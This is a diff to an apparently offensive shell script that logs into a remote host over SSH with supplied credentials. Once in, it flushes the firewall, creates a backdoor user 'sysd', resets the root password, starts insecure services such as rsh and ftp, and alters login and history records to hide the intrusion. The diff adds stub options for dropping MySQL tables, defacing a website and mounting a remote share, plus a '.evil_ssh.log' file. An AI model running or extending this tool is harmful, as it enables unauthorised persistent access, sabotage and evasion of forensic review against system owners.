@@ -3,6 +3,7 @@
 # TO DO
 # drop all mysql stuff option
 # deface website option
+# mount remote share
 
 if [ "$1" = "-h" -o "$1" = "--help" ]; then
 	echo "Usage: $0 [user@host]|[user@host:port] [password] [options]"
@@ -13,14 +14,17 @@ fi
 
 #variables - can be changed to meet different needs
 expectFile="connect.exp"
+errorFile=".evil_ssh.log"
 serviceStop="iptables"
 serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs smb smbd samba rsync rsh rlogin ftp"
 doServices="yes"
 newUser="sysd"
 newRootPass="Password!"
 newPass="Password!"
+dropTables="no"
+defaceSite="no"
+mountShare="no"
 alterLastHistory="yes"
-port=22
 
 if [ $# -gt 0 ]; then
 	firstArg=`echo $1 | /usr/bin/env awk -F":" '{print $1}'`
@@ -97,6 +101,14 @@ interact -o -nobuffer -re \$prompt return
 send "/usr/bin/env iptables -F || ipfw flush\r" #flush firewall rules
 MORE
 
+if [ "$dropTables" == "yes" ]; then
+	echo "Dropping all MySQL tables functionality not yet implemented"
+fi
+
+if [ "$defaceSite" == "yes" ]; then
+	echo "Defacing website functionality not yet implemented"
+fi
+
 #start certain services
 if [ "$doServices" == "yes" ]; then
 	for service in $serviceStart; do
@@ -109,6 +121,10 @@ if [ "$doServices" == "yes" ]; then
 		echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
 		echo "send\"/usr/bin/env service $service stop\r\" " >> $expectFile
 	done
+fi
+
+if [ "$mountShare" == "yes" ]; then
+	echo "Mounting remote share functionality not yet implemented"
 fi
 
 if [ "$alterLastHistory" == "yes" ]; then
